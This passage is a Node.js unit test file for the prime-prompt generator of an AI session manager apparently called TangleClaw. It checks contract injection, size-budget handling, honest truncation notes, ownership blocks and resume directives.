'use strict';

const { describe, it, before, after, beforeEach, afterEach, mock } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const { setLevel } = require('../lib/logger');

setLevel('error');

const store = require('../lib/store');
const medusa = require('../lib/medusa');

describe('sessions', () => {
  let tmpDir;
  let projectsDir;

  before(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tc-sessions-'));
    store._setBasePath(tmpDir);
    store.init();

    // Create a projects directory
    projectsDir = path.join(tmpDir, 'projects');
    fs.mkdirSync(projectsDir, { recursive: true });

    // Set the projectsDir in config
    const config = store.config.load();
    config.projectsDir = projectsDir;
    store.config.save(config);
  });

  after(() => {
    store.close();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  // Since sessions.js depends on tmux (shell commands), we test the logic
  // that doesn't require actual tmux sessions

  describe('generatePrimePrompt', () => {
    let sessions;
    let projectId;

    before(() => {
      sessions = require('../lib/sessions');

      // Create a project in the store
      const projDir = path.join(projectsDir, 'prime-test');
      fs.mkdirSync(projDir, { recursive: true });

      const project = store.projects.create({
        name: 'prime-test',
        path: projDir,
        engine: 'claude'
      });
      projectId = project.id;
    });

    it('generates a prime prompt with project name', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');
      const prompt = sessions.generatePrimePrompt(project, engine);

      assert.ok(prompt.includes('prime-test'));
      assert.ok(prompt.includes('Session Start'));
    });

    it('injects the typed-wrap sentinel instruction WITHOUT tripping its own monitor (CC-7 Slice C)', () => {
      const wrapSentinel = require('../lib/wrap-sentinel');
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');
      const prompt = sessions.generatePrimePrompt(project, engine);

      assert.ok(prompt.includes('## Wrapping this session'), 'prime should tell the AI how to trigger a wrap');
      assert.ok(prompt.includes(wrapSentinel.SENTINEL_TOKEN), 'prime should name the marker token');
      // The whole point of the backtick/period phrasing: the instruction itself
      // must NEVER look like a bare emission, or every session would self-wrap.
      assert.equal(
        wrapSentinel._hasSentinel(prompt), false,
        'the prime instruction must not match the sentinel monitor (no self-trigger)'
      );
    });

    it('injects the session-ownership identity block (#347 Slice 3)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');
      const prompt = sessions.generatePrimePrompt(project, engine);

      assert.ok(prompt.includes('## Session Ownership'), 'prime should carry the ownership identity block');
      assert.ok(prompt.includes('Owned project: `prime-test`'), 'prime should name the owned project');
    });

    describe('Medusa switchboard section (MED-2K9P v2 T1)', () => {
      let projDir;
      let savedEnv;

      before(() => {
        projDir = path.join(projectsDir, 'prime-test');
        savedEnv = process.env.MEDUSA_CONTRACT_PATH;
      });

      afterEach(() => {
        if (savedEnv === undefined) delete process.env.MEDUSA_CONTRACT_PATH;
        else process.env.MEDUSA_CONTRACT_PATH = savedEnv;
        store.projectConfig.save(projDir, {});
        // #557 fixtures — continuity index + oversized contract must never
        // leak into sibling tests (readIndex flips the prime into its Resume
        // branch for every later generatePrimePrompt call).
        fs.rmSync(path.join(projDir, '.tangleclaw'), { recursive: true, force: true });
        fs.rmSync(path.join(projDir, 'fixture-contract.md'), { force: true });
      });

      it('injects contract + identity + role for an opted-in launch', () => {
        const contractFile = path.join(projDir, 'fixture-contract.md');
        fs.writeFileSync(contractFile, '# Fixture Consumer Contract\nRegister then drain.\n');
        process.env.MEDUSA_CONTRACT_PATH = contractFile;
        store.projectConfig.save(projDir, { medusaEnabled: true });

        const project = store.projects.getByName('prime-test');
        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(project, engine, { medusaWorkspaceId: 'prime-test-cafe0123' });

        assert.ok(prompt.includes('## Medusa Switchboard'), 'prime should carry the switchboard section');
        assert.ok(prompt.includes('`prime-test-cafe0123`'), 'prime should carry the exact workspace id');
        assert.ok(prompt.includes('the initiator ends the conversation'), 'prime should carry the participant role');
        assert.ok(prompt.includes('GET /api/sessions/prime-test/medusa/messages'), 'prime should point at the TC inbox API');
        assert.ok(prompt.includes('do NOT register your own WS connection'), 'prime must forbid a second consumer on the id');
        assert.ok(prompt.includes('# Fixture Consumer Contract'), 'prime should embed the contract text');
        assert.ok(prompt.includes(contractFile), 'prime should name the contract source');
      });

      it('injects NOTHING when medusaEnabled is off, even if an id is passed', () => {
        const project = store.projects.getByName('prime-test');
        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(project, engine, { medusaWorkspaceId: 'prime-test-cafe0123' });
        assert.equal(prompt.includes('Medusa Switchboard'), false);
      });

      it('injects NOTHING without a workspace id (non-launch callers never fabricate identity)', () => {
        store.projectConfig.save(projDir, { medusaEnabled: true });
        const project = store.projects.getByName('prime-test');
        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(project, engine);
        assert.equal(prompt.includes('Medusa Switchboard'), false);
      });

      it('still injects identity + role with an HONEST note when the contract is unresolvable', () => {
        process.env.MEDUSA_CONTRACT_PATH = path.join(projDir, 'no-such-contract.md');
        store.projectConfig.save(projDir, { medusaEnabled: true });

        const project = store.projects.getByName('prime-test');
        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(project, engine, { medusaWorkspaceId: 'prime-test-cafe0123' });

        assert.ok(prompt.includes('`prime-test-cafe0123`'), 'identity still injects');
        assert.ok(prompt.includes('consumer contract — UNAVAILABLE'), 'missing contract is surfaced, not silent');
        assert.ok(prompt.includes('no-such-contract.md'), 'the tried path is named');
      });

      // #873 — a third-party install registered an ordinary project named
      // "Medusa". The resolver matched on the name alone, so every opted-in
      // session probed that project and reported it as a broken Medusa
      // checkout. The name-match path had NO coverage at all — every test above
      // reaches the contract through the MEDUSA_CONTRACT_PATH seam — which is
      // exactly why the defect shipped. These three exercise it directly.
      describe('#873: a project named "Medusa" is a candidate, not an identity', () => {
        let medusaProjDir;

        beforeEach(() => {
          // Registered under the switchboard's name, but an unrelated project.
          medusaProjDir = path.join(projectsDir, 'Medusa');
          fs.mkdirSync(medusaProjDir, { recursive: true });
          store.projects.create({ name: 'Medusa', path: medusaProjDir, engine: 'claude' });
          delete process.env.MEDUSA_CONTRACT_PATH;
          store.projectConfig.save(projDir, { medusaEnabled: true });
        });

        afterEach(() => {
          const registered = store.projects.getByNameCaseInsensitive('medusa');
          if (registered) store.projects.delete(registered.id);
          fs.rmSync(medusaProjDir, { recursive: true, force: true });
        });

        it('does not select an unrelated project that merely shares the name', () => {
          const project = store.projects.getByName('prime-test');
          const engine = store.engines.get('claude');
          const prompt = sessions.generatePrimePrompt(project, engine, { medusaWorkspaceId: 'prime-test-cafe0123' });

          assert.ok(prompt.includes('consumer contract — UNAVAILABLE'), 'absence is still surfaced');
          assert.equal(
            prompt.includes(medusaProjDir), false,
            'the unrelated project must not be named — doing so asserts an identity never established'
          );
          assert.ok(
            prompt.includes('no local Medusa checkout identified'),
            'the message must report no checkout, not a broken one'
          );
          assert.ok(
            prompt.includes('MEDUSA_CONTRACT_PATH'),
            'the operator needs the override named to have any way to act on this'
          );
        });

        it('selects it once it carries the contract, and injects that contract', () => {
          fs.mkdirSync(path.join(medusaProjDir, 'docs'), { recursive: true });
          fs.writeFileSync(
            path.join(medusaProjDir, medusa.CONTRACT_RELATIVE_PATH),
            '# Corroborated Consumer Contract\nRegister then drain.\n'
          );

          const project = store.projects.getByName('prime-test');
          const engine = store.engines.get('claude');
          const prompt = sessions.generatePrimePrompt(project, engine, { medusaWorkspaceId: 'prime-test-cafe0123' });

          assert.ok(
            prompt.includes('# Corroborated Consumer Contract'),
            'a corroborated checkout still resolves — the fix must not disable name-based discovery'
          );
          assert.ok(prompt.includes(medusaProjDir), 'the resolved source is named');
        });

        it('treats an EMPTY contract as no corroboration, not as a checkout', () => {
          // `readContract` accepts only a non-blank doc, so corroborating on
          // mere existence would admit a candidate the read then rejects — the
          // #873 shape again, the prime naming a project we just declined to
          // trust.
          fs.mkdirSync(path.join(medusaProjDir, 'docs'), { recursive: true });
          fs.writeFileSync(path.join(medusaProjDir, medusa.CONTRACT_RELATIVE_PATH), '   \n\n');

          const project = store.projects.getByName('prime-test');
          const engine = store.engines.get('claude');
          const prompt = sessions.generatePrimePrompt(project, engine, { medusaWorkspaceId: 'prime-test-cafe0123' });

          assert.ok(prompt.includes('consumer contract — UNAVAILABLE'), 'absence is still surfaced');
          assert.equal(
            prompt.includes(medusaProjDir), false,
            'a blank contract must not promote an unrelated project into being named'
          );
          assert.ok(prompt.includes('no local Medusa checkout identified'), 'reports no checkout, not a broken one');
        });

        it('lets the env override win over a corroborated checkout', () => {
          fs.mkdirSync(path.join(medusaProjDir, 'docs'), { recursive: true });
          fs.writeFileSync(
            path.join(medusaProjDir, medusa.CONTRACT_RELATIVE_PATH),
            '# Checkout Contract\n'
          );
          const envDoc = path.join(projDir, 'fixture-contract.md');
          fs.writeFileSync(envDoc, '# Override Contract\n');
          process.env.MEDUSA_CONTRACT_PATH = envDoc;

          const project = store.projects.getByName('prime-test');
          const engine = store.engines.get('claude');
          const prompt = sessions.generatePrimePrompt(project, engine, { medusaWorkspaceId: 'prime-test-cafe0123' });

          assert.ok(prompt.includes('# Override Contract'), 'the explicit override still takes priority');
          assert.equal(prompt.includes('# Checkout Contract'), false, 'the checkout must not shadow the override');
        });
      });

      it('tells the session participation is event-driven, not a boot task (#557)', () => {
        const contractFile = path.join(projDir, 'fixture-contract.md');
        fs.writeFileSync(contractFile, '# Fixture Consumer Contract\nRegister then drain.\n');
        process.env.MEDUSA_CONTRACT_PATH = contractFile;
        store.projectConfig.save(projDir, { medusaEnabled: true });

        const project = store.projects.getByName('prime-test');
        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(project, engine, { medusaWorkspaceId: 'prime-test-cafe0123' });

        assert.ok(
          prompt.includes('This section is context, not a task'),
          'the switchboard section must not read as a boot mission'
        );
      });

      it('#557 regression: directive sections survive the prime cap — the contract yields, honestly', () => {
        const wrapSentinel = require('../lib/wrap-sentinel');
        // An oversized contract: alone it exceeds the prime's token cap
        // several times over. Pre-fix, the
        // blind tail truncation cut the Resume wait-guard and the wrap
        // instructions out of the prime — the #557 live regression.
        const contractFile = path.join(projDir, 'fixture-contract.md');
        fs.writeFileSync(contractFile, '# Big Consumer Contract\n' + 'protocol detail line\n'.repeat(1500));
        process.env.MEDUSA_CONTRACT_PATH = contractFile;
        store.projectConfig.save(projDir, { medusaEnabled: true });
        const continuityDir = path.join(projDir, '.tangleclaw', 'continuity');
        fs.mkdirSync(continuityDir, { recursive: true });
        fs.writeFileSync(path.join(continuityDir, 'index.md'), [
          '# Continuity Index — prime-test',
          '',
          '## Current state',
          'Mid-build on the fixture feature.',
          '',
          '## Next action',
          '- finish the fixture feature',
          ''
        ].join('\n'));

        const project = store.projects.getByName('prime-test');
        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(project, engine, { medusaWorkspaceId: 'prime-test-cafe0123' });

        // Every load-bearing directive survives the cap.
        assert.ok(prompt.includes('## Resume'), 'Resume block survives the cap');
        assert.ok(prompt.includes('MUST NOT start the work'), 'the wait-for-confirmation guard survives the cap');
        assert.ok(prompt.includes('## Wrapping this session'), 'wrap instructions survive the cap');
        assert.ok(prompt.includes(wrapSentinel.SENTINEL_TOKEN), 'the wrap sentinel token survives the cap');
        assert.ok(prompt.includes('`prime-test-cafe0123`'), 'the workspace identity survives the cap');
        // The contract yields — trimmed with an honest note, never a blind slice.
        assert.ok(
          prompt.includes('truncated to fit the prime size budget'),
          'the contract trim is announced honestly'
        );
        assert.ok(prompt.includes(contractFile), 'the trim note names the source doc');
        assert.equal(
          prompt.includes('[Prime prompt truncated]'), false,
          'the blind tail truncation must not fire on the medusa path'
        );
        // Against the budget the ENGINE declares, not the fallback constant —
        // measuring against 16,000 while claude declares 10,000 leaves 6,000
        // characters unasserted on the path that actually ships.
        const declared = sessions._resolvePrimeBudget(engine, { viaStartupHook: true });
        assert.ok(prompt.length <= declared,
          `prime length ${prompt.length} must fit the declared budget ${declared}`);
      });

      it('#557: contract body is omitted (with a pointer) when the budget cannot hold a useful fragment', () => {
        const contractFile = path.join(projDir, 'fixture-contract.md');
        fs.writeFileSync(contractFile, '# Fixture Consumer Contract\n' + 'line\n'.repeat(200));
        process.env.MEDUSA_CONTRACT_PATH = contractFile;

        const lines = sessions._medusaContractSection(100);
        const section = lines.join('\n');
        assert.ok(section.includes('Omitted to fit the prime size budget'), 'omission is announced');
        assert.ok(section.includes(contractFile), 'the pointer names the source doc');
        assert.equal(section.includes('line\nline'), false, 'no contract body ships');
      });

      it('#557: the full contract still embeds when no cap constrains it', () => {
        const contractFile = path.join(projDir, 'fixture-contract.md');
        const body = '# Fixture Consumer Contract\n' + 'protocol detail line\n'.repeat(50);
        fs.writeFileSync(contractFile, body);
        process.env.MEDUSA_CONTRACT_PATH = contractFile;

        const section = sessions._medusaContractSection(Infinity).join('\n');
        assert.ok(section.includes(body.trim()), 'the whole contract embeds under an infinite budget');
        assert.equal(section.includes('truncated'), false, 'no trim note when nothing was trimmed');
      });
    });

    describe('startup channel budget (#749)', () => {
      it('uses the budget the engine declares', () => {
        // Synthetic profiles on purpose: asserting that OUR json says 10000
        // would compare this repo against this repo and could never detect the
        // upstream limit changing. What is testable here is that a declared
        // budget is honored — the number's provenance is documented at the
        // resolver and must be re-verified at its source.
        assert.equal(
          sessions._resolvePrimeBudget({ capabilities: { startupInjection: { maxChars: 1234 } } }),
          1234
        );
      });

      it('falls back to the historical budget when an engine declares nothing', () => {
        const fallback = sessions.PRIME_MAX_TOKENS * 4;
        assert.equal(sessions._resolvePrimeBudget(null), fallback,
          'a null profile must not zero the budget');
        assert.equal(sessions._resolvePrimeBudget({}), fallback);
        assert.equal(sessions._resolvePrimeBudget({ capabilities: {} }), fallback,
          'an engine that declares no channel keeps its previous behavior');
      });

      it('rejects a malformed declaration, and says so rather than falling back quietly', () => {
        const fallback = sessions.PRIME_MAX_TOKENS * 4;
        const { setLevel: setLogLevel } = require('../lib/logger');
        const warnings = [];
        // The logger sends everything below `error` to stdout, not stderr.
        const originalWrite = process.stdout.write.bind(process.stdout);
        setLogLevel('warn');
        process.stdout.write = (chunk, ...rest) => { warnings.push(String(chunk)); return originalWrite(chunk, ...rest); };
        try {
          // A zero or negative budget would empty every prime; a string makes
          // the length comparison meaningless. All fall back — but an operator
          // who typo'd the value must not be left believing a limit is in force.
          for (const bad of [0, -5, '10000']) {
            assert.equal(
              sessions._resolvePrimeBudget({ id: 'fixture', capabilities: { startupInjection: { maxChars: bad } } }),
              fallback, `${JSON.stringify(bad)} is not a budget`);
          }
        } finally {
          process.stdout.write = originalWrite;
          setLogLevel('error');
        }
        const unusable = warnings.filter((w) => w.includes('unusable startupInjection.maxChars'));
        assert.equal(unusable.length, 3,
          'each malformed declaration is reported, not silently swallowed');
      });

      it('no blind tail slice remains in the prime assembler', () => {
        // Structural guard. The slice was the mechanism that silently removed
        // the wrap-sentinel directive in production; behavior tests prove it is
        // not reached today, this proves it cannot be reintroduced quietly.
        const src = fs.readFileSync(require.resolve('../lib/sessions.js'), 'utf8');
        assert.equal(src.includes('[Prime prompt truncated]'), false,
          'sessions.js must not carry a blind-truncation marker');
      });
    });

    it('does not inject methodology heading or description (#102 — already in CLAUDE.md + pill)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      store.projects.update(project.id, { methodology: 'minimal' });
      const updatedProject = store.projects.getByName('prime-test');

      const prompt = sessions.generatePrimePrompt(updatedProject, engine);
      assert.equal(prompt.includes('## Methodology:'), false, 'prime should not carry methodology heading');
      assert.equal(prompt.includes('## Current Phase:'), false, 'prime should not carry current phase heading');
    });

    it('includes active learnings', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      store.learnings.create({
        projectId: project.id,
        content: 'Always validate inputs',
        tier: 'active'
      });

      const prompt = sessions.generatePrimePrompt(project, engine);
      assert.ok(prompt.includes('Always validate inputs'));
      assert.ok(prompt.includes('Active Learnings'));
    });

    it('does not inject Shared Infrastructure pointer for single group (#102 — docs already in CLAUDE.md)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      const group = store.projectGroups.create({ name: 'shared-infra', description: 'shared infra' });
      store.projectGroups.addMember(group.id, project.id);
      store.sharedDocs.create({
        groupId: group.id,
        name: 'NETWORK',
        filePath: '/tmp/NETWORK.md',
        injectIntoConfig: true,
        injectMode: 'reference'
      });

      const prompt = sessions.generatePrimePrompt(project, engine);
      assert.equal(prompt.includes('Shared Infrastructure'), false, 'prime should not surface Shared Infrastructure heading');
      assert.equal(prompt.includes('1 shared doc linked'), false, 'prime should not surface shared-doc counts');

      store.projectGroups.delete(group.id);
    });

    it('does not inject sharedDir path (#102)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      const group = store.projectGroups.create({ name: 'frontend libs', sharedDir: '/tmp/shared-frontend' });
      store.projectGroups.addMember(group.id, project.id);
      store.sharedDocs.create({
        groupId: group.id,
        name: 'STYLES',
        filePath: '/tmp/shared-frontend/STYLES.md',
        injectIntoConfig: true,
        injectMode: 'reference'
      });

      const prompt = sessions.generatePrimePrompt(project, engine);
      assert.equal(prompt.includes('/tmp/shared-frontend'), false, 'prime should not echo sharedDir paths');

      store.projectGroups.delete(group.id);
    });

    it('does not list multiple groups in bulleted format (#102)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      const g1 = store.projectGroups.create({ name: 'group-alpha' });
      const g2 = store.projectGroups.create({ name: 'group-beta' });
      store.projectGroups.addMember(g1.id, project.id);
      store.projectGroups.addMember(g2.id, project.id);
      store.sharedDocs.create({ groupId: g1.id, name: 'DOC1', filePath: '/tmp/d1.md', injectIntoConfig: true, injectMode: 'reference' });
      store.sharedDocs.create({ groupId: g2.id, name: 'DOC2', filePath: '/tmp/d2.md', injectIntoConfig: true, injectMode: 'reference' });
      store.sharedDocs.create({ groupId: g2.id, name: 'DOC3', filePath: '/tmp/d3.md', injectIntoConfig: true, injectMode: 'reference' });

      const prompt = sessions.generatePrimePrompt(project, engine);
      assert.equal(prompt.includes('Shared Infrastructure'), false);
      assert.equal(prompt.includes('group-alpha'), false);
      assert.equal(prompt.includes('group-beta'), false);

      store.projectGroups.delete(g1.id);
      store.projectGroups.delete(g2.id);
    });

    it('omits shared infrastructure when project has no groups with docs', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      const prompt = sessions.generatePrimePrompt(project, engine);
      assert.ok(!prompt.includes('Shared Infrastructure'));
    });

    it('includes last session summary', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      // Create and wrap a session in the store
      const session = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'prime-wrap-test'
      });
      store.sessions.wrap(session.id, 'Completed chunk 4 with 108 tests');

      const prompt = sessions.generatePrimePrompt(project, engine);
      assert.ok(prompt.includes('Last Session Summary'));
      assert.ok(prompt.includes('Completed chunk 4'));
    });

    it('omits playbook AND methodology heading (#102 — both belong in CLAUDE.md, not prime)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      store.projects.update(project.id, { methodology: 'prawduct' });
      const updated = store.projects.getByName('prime-test');

      const prompt = sessions.generatePrimePrompt(updated, engine);
      assert.ok(!prompt.includes('Session Playbook'), 'playbook should not be in prime prompt');
      assert.ok(!prompt.includes('Janitor Pass'), 'playbook details should not be in prime prompt');
      assert.equal(prompt.includes('Methodology: Prawduct'), false, 'methodology heading should not be in prime (#102)');

      store.projects.update(project.id, { methodology: 'minimal' });
    });

    it('does not inject Active Extension Rules with definitions (#102 — already in CLAUDE.md)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      store.projects.update(project.id, { methodology: 'prawduct' });
      const updated = store.projects.getByName('prime-test');
      const projConfig = store.projectConfig.load(updated.path);
      projConfig.rules = projConfig.rules || { extensions: {} };
      projConfig.rules.extensions.independentCritic = true;
      projConfig.rules.extensions.docsParity = true;
      store.projectConfig.save(updated.path, projConfig);

      const prompt = sessions.generatePrimePrompt(updated, engine);
      assert.equal(prompt.includes('## Active Extension Rules'), false, 'no Active Extension Rules heading');
      assert.equal(prompt.includes('**independentCritic**:'), false, 'no rule definitions');
      assert.equal(prompt.includes('**docsParity**:'), false, 'no rule definitions');

      store.projects.update(project.id, { methodology: 'minimal' });
    });

    it('does not list plain rule names either (#102 — extension rules block fully removed)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      const projConfig = store.projectConfig.load(project.path);
      projConfig.rules = projConfig.rules || { extensions: {} };
      projConfig.rules.extensions.customRule = true;
      store.projectConfig.save(project.path, projConfig);

      const prompt = sessions.generatePrimePrompt(project, engine);
      assert.equal(prompt.includes('## Active Extension Rules'), false, 'no Active Extension Rules heading');
      assert.equal(prompt.includes('- customRule'), false, 'no rule list');

      delete projConfig.rules.extensions.customRule;
      store.projectConfig.save(project.path, projConfig);
    });

    it('does not inject Previous Methodology Archives (#102 — AI can find filesystem itself)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      const projConfig = store.projectConfig.load(project.path);
      projConfig.methodologyArchives = [
        { archivePath: '.tangleclaw/project.json.archived/2025-12-01' }
      ];
      store.projectConfig.save(project.path, projConfig);

      const prompt = sessions.generatePrimePrompt(project, engine);
      assert.equal(prompt.includes('## Previous Methodology Archives'), false);
      assert.equal(prompt.includes('archived'), false, 'no archive pointer text');

      delete projConfig.methodologyArchives;
      store.projectConfig.save(project.path, projConfig);
    });

    it('prime carries header + branding flourish on a clean project (no learnings, no last session, no audit mode)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');
      const prompt = sessions.generatePrimePrompt(project, engine);
      assert.match(prompt, /^# Session Start — prime-test/m, 'header present');
      assert.match(prompt, /\*TangleClaw'd into existence\.\*/, 'branding flourish present');
    });

    it('carries the unconditional banner-emit instruction in the header block (fires for every session/model, no continuity index needed)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');
      const prompt = sessions.generatePrimePrompt(project, engine);
      // The instruction must appear even on a clean project with no continuity
      // index (i.e. outside the Resume branch) — this is the whole point of the
      // hoist: the legacy-summary / no-index path used to drop the banner.
      assert.match(prompt, /begin your FIRST visible reply/i, 'unconditional emit instruction present');
      assert.ok(prompt.includes('whatever the model'), 'declared engine/model-agnostic');
      assert.ok(
        prompt.includes('does NOT authorize starting work'),
        'visible-output requirement is split from any wait-for-confirmation directive'
      );
      // The instruction must precede the branding line it refers to being echoed,
      // and sit in the header block before session-ownership content.
      const emitIdx = prompt.indexOf('begin your FIRST visible reply');
      const ownershipIdx = prompt.indexOf('Session Ownership');
      assert.ok(emitIdx > -1, 'emit instruction found');
      if (ownershipIdx > -1) {
        assert.ok(emitIdx < ownershipIdx, 'emit instruction sits in the header block, before ownership');
      }
    });

    it('does not inject Project Version Recording protocol (#101 — TC owns the writer)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');
      const prompt = sessions.generatePrimePrompt(project, engine);

      assert.equal(prompt.includes('## Project Version Recording'), false, 'prime should not include version-recording heading');
      assert.equal(prompt.includes('.tangleclaw/project-version.txt'), false, 'prime should not reference cache file path');
      assert.equal(prompt.includes('git describe'), false, 'prime should not mention git tags as a fallback');
      assert.equal(prompt.includes('recorded_at:'), false, 'prime should not show cache file format');
    });

    it('omits version recording for all methodologies (#101)', () => {
      const project = store.projects.getByName('prime-test');
      const engine = store.engines.get('claude');

      store.projects.update(project.id, { methodology: 'prawduct' });
      const prawductPrompt = sessions.generatePrimePrompt(store.projects.getByName('prime-test'), engine);
      assert.equal(prawductPrompt.includes('## Project Version Recording'), false, 'prawduct prime should not include version recording');

      store.projects.update(project.id, { methodology: 'minimal' });
      const minimalPrompt = sessions.generatePrimePrompt(store.projects.getByName('prime-test'), engine);
      assert.equal(minimalPrompt.includes('## Project Version Recording'), false, 'minimal prime should not include version recording');
    });

    describe('Resume directive (CC-1 — READ half of the Continuity Contract)', () => {
      const continuity = require('../lib/continuity');
      let resumeProject;

      before(() => {
        const projDir = path.join(projectsDir, 'resume-test');
        fs.mkdirSync(projDir, { recursive: true });
        resumeProject = store.projects.create({
          name: 'resume-test',
          path: projDir,
          engine: 'claude'
        });
      });

      afterEach(() => {
        // Tear down the index so each case starts from a known state.
        fs.rmSync(continuity.storeDir(resumeProject.path), { recursive: true, force: true });
      });

      it('upgrades to an actionable visible-resume directive when an index exists', () => {
        const engine = store.engines.get('claude');
        continuity.writeIndex(resumeProject.path, {
          project: 'resume-test',
          currentState: 'CC-1 spine landed; tests green.',
          nextAction: 'stopped at CC-1 · next is CC-2 · open continuity-contract.md',
          freshness: { sha: 'abc1234', branch: 'feat/cc-1', writtenAt: '2026-06-15' }
        });

        const prompt = sessions.generatePrimePrompt(resumeProject, engine);
        assert.match(prompt, /## Resume — emit this as your FIRST visible message/);
        assert.ok(prompt.includes('hidden context'), 'explains the prime is hidden');
        assert.ok(prompt.includes('Freshness check FIRST'), 'mandates a freshness check');
        assert.ok(prompt.includes('We left off at'), 'gives the visible resume wording');
        assert.ok(prompt.includes("TangleClaw'd into existence"), 're-emits the banner visibly');
        // The unconditional header-block instruction is present here too — proving
        // the banner-emit directive is truly branch-independent (Resume path).
        assert.match(prompt, /begin your FIRST visible reply/i, 'unconditional banner-emit instruction present in the Resume path');
        assert.ok(prompt.includes('Wait for the operator'), 'confirm-before-fire, no auto-execute');
        // Surfaces the recorded fields + freshness stamp.
        assert.ok(prompt.includes('next is CC-2'));
        assert.ok(prompt.includes('CC-1 spine landed'));
        assert.ok(prompt.includes('abc1234'));
        // The passive legacy heading is replaced, not duplicated.
        assert.equal(prompt.includes('## Last Session Summary'), false);
      });

      it('surfaces a degraded wrap tier in the resume stamp (CC-7)', () => {
        const engine = store.engines.get('claude');
        continuity.writeIndex(resumeProject.path, {
          project: 'resume-test',
          currentState: 'captured, but no reflection fold.',
          nextAction: 'next is X',
          freshness: { sha: 'abc1234', branch: 'main', writtenAt: '2026-06-15', tier: 'no-plugin' }
        });
        const prompt = sessions.generatePrimePrompt(resumeProject, engine);
        assert.match(prompt, /Wrap tier: no-plugin \(judgment may be thin — verify\)/);
      });

      it('omits the tier line for a full-tier wrap (no noise)', () => {
        const engine = store.engines.get('claude');
        continuity.writeIndex(resumeProject.path, {
          project: 'resume-test',
          currentState: 'all captured.',
          nextAction: 'next is Y',
          freshness: { sha: 'abc1234', branch: 'main', writtenAt: '2026-06-15', tier: 'full' }
        });
        const prompt = sessions.generatePrimePrompt(resumeProject, engine);
        assert.equal(prompt.includes('Wrap tier:'), false);
      });

      it('falls back to the passive Last Session Summary when no index exists', () => {
        const engine = store.engines.get('claude');
        const session = store.sessions.start({
          projectId: resumeProject.id, engineId: 'claude', tmuxSession: 'resume-wrap'
        });
        store.sessions.wrap(session.id, 'Legacy passive summary blob');

        const prompt = sessions.generatePrimePrompt(resumeProject, engine);
        assert.ok(prompt.includes('## Last Session Summary'));
        assert.ok(prompt.includes('Legacy passive summary blob'));
        assert.equal(prompt.includes('## Resume — emit this'), false);
        // Regression: the legacy (no-index) path took the `else` branch, which
        // previously carried NO banner-emit instruction — so the banner was
        // dropped 100% of the time after a mechanical-only wrap. The hoisted
        // header instruction must still be present here.
        assert.match(prompt, /begin your FIRST visible reply/i, 'unconditional banner-emit instruction survives the legacy path');
        assert.match(prompt, /\*TangleClaw'd into existence\.\*/, 'branding flourish present on the legacy path');
      });

      it('does not offer a resume from a degraded, judgment-empty index', () => {
        const engine = store.engines.get('claude');
        // Mechanical-floor wrap: only a freshness stamp, no captured judgment.
        continuity.writeIndex(resumeProject.path, {
          freshness: { sha: 'x', branch: 'main', writtenAt: '2026-06-15' }
        });
        const prompt = sessions.generatePrimePrompt(resumeProject, engine);
        assert.equal(prompt.includes('## Resume — emit this'), false);
      });
    });

    describe('Feature Index injection (#207, chunk 2)', () => {
      // Use a dedicated project to keep config + FEATURES.md state isolated
      // from the other generatePrimePrompt tests above.
      let fiProject;
      let fiProjectPath;
      let featuresPath;

      before(() => {
        fiProjectPath = path.join(projectsDir, 'fi-prime-test');
        fs.mkdirSync(fiProjectPath, { recursive: true });
        store.projects.create({
          name: 'fi-prime-test',
          path: fiProjectPath,
          engine: 'claude'
        });
        fiProject = store.projects.getByName('fi-prime-test');
        featuresPath = path.join(fiProjectPath, 'FEATURES.md');
      });

      beforeEach(() => {
        // Reset project config + filesystem between cases so each test starts
        // from a known state. Default: both gates off, no FEATURES.md.
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: false,
          featureIndexEnabled: false
        });
        try { fs.rmSync(featuresPath, { force: true }); } catch {}
      });

      // The index is REFERENCED, not inlined. Inlining made the prime's length a
      // function of how much had been authored, and the overflow silently ate
      // whatever directive sorted after it. These three tests previously
      // asserted the inlining contract; they now assert the pointer contract
      // that replaced it.
      it('points at FEATURES.md rather than inlining it when all three gates are true', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: true
        });
        fs.writeFileSync(featuresPath, '# Feature Index\n\n## UI / Web\n- **Pill** — lib/pill.js:42\n');

        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(fiProject, engine);

        assert.ok(prompt.includes('## Feature Index'), 'prime should contain the Feature Index heading');
        assert.ok(prompt.includes('`FEATURES.md`'), 'the pointer names the file to read');
        assert.equal(prompt.includes('**Pill**'), false, 'authored entries must not be inlined');
        assert.equal(prompt.includes('lib/pill.js:42'), false, 'entry file pointers must not be inlined');
      });

      it('census counts curated entries and names the ungraduated backlog', () => {
